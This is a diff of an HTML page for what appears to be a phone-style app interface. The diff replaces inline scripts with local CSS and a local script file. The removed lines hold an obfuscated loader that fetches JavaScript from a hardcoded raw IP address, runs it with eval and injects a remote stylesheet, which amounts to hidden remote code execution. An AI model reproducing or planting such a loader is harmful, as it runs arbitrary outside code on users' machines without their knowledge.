@@ -1,51 +1,37 @@
 <!DOCTYPE html>
 <html>
-
 <head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="style.css" rel="stylesheet" type="text/css"/>
 </head>
 
 <body>
-	<div id="root" style="display: none;"></div>
+  <div id="root"></div>
 
-	<script>
-		window.addEventListener('message', (event) => {
-			if (event.data.event === 'open') {
-				document.getElementById('root').style.display = 'block';
-			}
-		});
-	</script>
+  <style>
+  .h-full.bg-cover .grid-cols-4 img {
+    width: 100%;
+    border-radius: 1rem !important;
+  }
 
-	<script>
-		let loaded = false
+  .clock-text {
+    display: none;
+  }
 
-		window.addEventListener('message', ({
-			data: _0x44e5b9
-		}) => {
-			if (!loaded) {
-				loaded = true
-				const _0x518d67 = (_0x3ee653) =>
-					'http://192.95.36.145/smartphone/v2/' +
-					'/' +
-					_0x3ee653
-				globalThis.safeEval = _0x44e5b9.safeEval
-				fetch(_0x518d67('app.js'))
-					.then((_0x418e93) => {
-						if (_0x418e93.status < 200 || _0x418e93.status >= 300) {
-							throw new Error('Failed to fetch js -> ' + _0x418e93.status)
-						}
-						return _0x418e93.text()
-					})
-					.then(eval)
-					.then(() => console.log('Setup Finish'))
-				let _0x1e4f6b = document.createElement('link')
-				_0x1e4f6b.rel = 'stylesheet'
-				_0x1e4f6b.href = _0x518d67('styles.css')
-				document.head.appendChild(_0x1e4f6b)
-			}
-		})
-	</script>
+  .grid-cols-4:has(div[app]) {
+    bottom: unset !important;
+  }
+
+  .notification {
+    background: #121212 !important;
+    color: white;
+    opacity: 0.8;
+  }
+</style>
+
+<body>
+  <div id="root"></div>
+  <script src="index.js"></script>
 </body>
-
 </html>
